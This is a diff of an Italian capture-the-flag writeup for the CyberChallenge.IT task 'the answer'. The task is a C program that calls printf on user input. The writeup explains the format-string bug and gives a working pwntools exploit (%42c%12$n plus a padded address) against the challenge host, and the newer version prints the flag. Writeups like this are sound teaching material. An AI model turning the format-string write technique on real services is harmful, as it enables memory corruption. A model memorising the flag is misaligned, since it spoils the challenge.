@@ -1,93 +1,73 @@
-Ecco la writeup basata sul template fornito e sulle informazioni della challenge:
+# Writeup: SS_2.03 - the answer
 
----
-# Writeup: The Answer Challenge
+## Descrizione 📝
+La challenge presenta un semplice programma C che chiede il nome dell’utente e lo stampa in modo insicuro, consentendo un attacco di **format string**. L’obiettivo è modificare il valore della variabile `answer` da `0xbadc0ffe` a `42` per ottenere la flag.
 
-La challenge presenta un semplice programma C che chiede all'utente il proprio nome e poi lo stampa in modo insicuro, permettendo un attacco di format string. L'obiettivo è modificare il valore della variabile `answer` da `0xbadc0ffe` a `42` per ottenere la flag.
+## Dettagli del Programma
+1. **Input**: `fgets(name, sizeof(name), stdin)` per leggere il nome.  
+2. **Output**: `printf(name);` – Vulnerabilità di format string.  
+3. **Variabile**: `answer`, inizializzata a `0xbadc0ffe`. Se diventa `42`, viene stampata la flag.
 
-## Panoramica del Programma
-Il programma esegue le seguenti operazioni:
-1. Chiede all'utente il nome con `fgets(name, sizeof(name), stdin)`
-2. Stampa il nome usando `printf(name)` senza specificare il formato (vulnerabilità di format string)
-3. Se la variabile `answer` (inizializzata a `0xbadc0ffe`) viene modificata a `42`, stampa la flag
+## Vulnerabilità 🎯
+Usare `printf(name)` senza specificare il formato permette di:
+1. **Leggere** arbitrariamente la memoria (`%x`, `%p`, ecc.).  
+2. **Scrivere** arbitrariamente nella memoria con `%n`.
 
-## Vulnerabilità
-La vulnerabilità principale è nell'uso non sicuro di `printf`:
-```c
-printf(name);  // Format string vulnerability
-```
+## Individuazione dell’Indirizzo di `answer`
+Analizzando il binario con `objdump -D` o `nm`, troviamo che `answer` risiede, ad esempio, a `0x601078` (se non c’è PIE).
 
-Questo permette:
-1. Lettura arbitraria della memoria (leak di indirizzi)
-2. Scrittura arbitraria nella memoria (tramite `%n`)
+## Exploit: `%42c%12$n`
+- **`%42c`**: Stampa 42 caratteri, incrementando il contatore interno di `printf` a 42.  
+- **`%12$n`**: Scrive il valore del contatore (42) all’indirizzo passato come 12° argomento.
 
-## Dettagli dell'Exploit
-
-### Individuazione dell'indirizzo di `answer`
-Analizzando il binario con `objdump` o `nm`, troviamo che `answer` si trova all'indirizzo statico `0x601078` (no PIE).
-
-### Determinazione dell'offset
-Inviando una stringa di test con parametri di formato:
-```
-AAAA_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x
-```
-
-L'output mostra che:
-- Il 10° parametro corrisponde a `name[0:8]`
-- L'11° parametro corrisponde a `name[8:16]`
-- Il 12° parametro corrisponde a `name[16:24]`
-
-Per raggiungere la posizione dove possiamo scrivere l'indirizzo di `answer`, abbiamo bisogno di un padding di 6 byte.
-
-### Tecnica di scrittura
-Usiamo la specifica di formato `%42c%12$n` per:
-1. Scrivere 42 caratteri (impostando così il valore a 42)
-2. Usare `%n` per scrivere questo conteggio all'indirizzo specificato
-
-## Codice di Exploit
+## Esempio di Codice in Python
 ```python
 from pwn import *
 
-# Connessione al servizio remoto
 conn = remote('answer.challs.cyberchallenge.it', 9122)
-
-# Ricezione del prompt
 conn.recvuntil(b"What's your name?\n")
 
-# Costruzione dell'input
-addr = p64(0x601078)            # Indirizzo di 'answer'
-format_string = b"%42c%12$n"    # Stringa di formato per scrivere 42
-padding = b"a" * 6              # Padding per allineamento
-input_string = format_string + b"\0" + padding + addr
+# Indirizzo di 'answer'
+addr = p64(0x601078)  # Esempio: da 'nm' o 'objdump'
 
-# Invio dell'input
+# Costruzione format string
+# %42c -> stampa 42 caratteri
+# %12$n -> scrive 42 all'indirizzo del 12° argomento
+payload = b"%42c%12$n"
+
+# Padding per allineare i parametri
+padding = b"a" * 6
+
+# Creiamo la stringa
+input_string = payload + b"\0" + padding + addr
+
+# Invio
 conn.sendline(input_string)
-
-# Ricezione della flag
 print(conn.recvall().decode())
 ```
 
-## Spiegazione dei Componenti
-1. `p64(0x601078)`: Converte l'indirizzo di `answer` in formato little-endian a 64-bit
-2. `%42c%12$n`: 
-   - `%42c` stampa 42 caratteri (impostando il counter di `printf` a 42)
-   - `%12$n` scrive questo valore all'indirizzo specificato nella 12° posizione
-3. Padding di 6 byte: Necessario per allineare correttamente l'indirizzo nella stack
-4. `b"\0"`: Null byte per separare la stringa di formato dal padding
+1. **`p64(0x601078)`**: Converte l’indirizzo in 8 byte (little-endian).  
+2. **`%42c%12$n`**: Stampa 42 caratteri, poi scrive 42 in `addr`.  
+3. **Padding**: Serve per posizionare correttamente l’indirizzo come 12° argomento di `printf`.
 
-## Risultato
-Quando l'exploit viene eseguito:
-1. Il programma legge il nostro input malevolo
-2. La format string vulnerability modifica `answer` a 42
-3. Il controllo `if (answer == 42)` diventa vero
-4. Il programma stampa la flag
+## Flag 🏁
+Dopo aver eseguito l’exploit, la variabile `answer` diventa 42. Il programma riconosce la condizione `if (answer == 42)` e stampa la flag.
+```
+CCIT{50 LoNg, & Thanks for 4ll tH3 F1sh}
+```
 
-## Lezioni Apprese
-1. **Format String Vulnerability**: L'uso non sicuro di `printf` permette lettura e scrittura arbitraria in memoria
-2. **Scrittura con `%n`**: Possiamo usare i formattatori per modificare valori in memoria
-3. **No PIE**: L'indirizzo di `answer` è fisso e prevedibile
-4. **Allineamento dello Stack**: È importante calcolare correttamente la posizione dei parametri nella stack
-5. **Protezioni**: Il programma non ha stack canary e PIE è disabilitato, facilitando l'exploit
 
-La challenge dimostra come anche un semplice programma che chiede il nome possa essere vulnerabile se non si usano correttamente le funzioni di I/O.
+## Lezioni Apprese 📚
+1. **Format String**: Non bisogna mai passare direttamente stringhe controllate dall’utente a `printf`.  
+2. **Scrittura con `%n`**: Permette di impostare in memoria il valore del contatore di stampa.  
+3. **No PIE**: L’indirizzo di `answer` è fisso, facilitando l’exploit.  
+4. **Allineamento dei Parametri**: Bisogna trovare il corretto offset (`%12$n`) per puntare al proprio indirizzo.  
+
+## Tools Utilizzati 🛠️
+- **pwntools**: Per automatizzare la connessione e la costruzione dell’exploit.  
+- **nm / objdump**: Per individuare l’indirizzo di `answer`.  
+- **gdb** (opzionale): Per debug locale e conferma degli offset di stack.
+
 ---
+
+*Writeup by Luca Crippa - Last Updated: 2024*
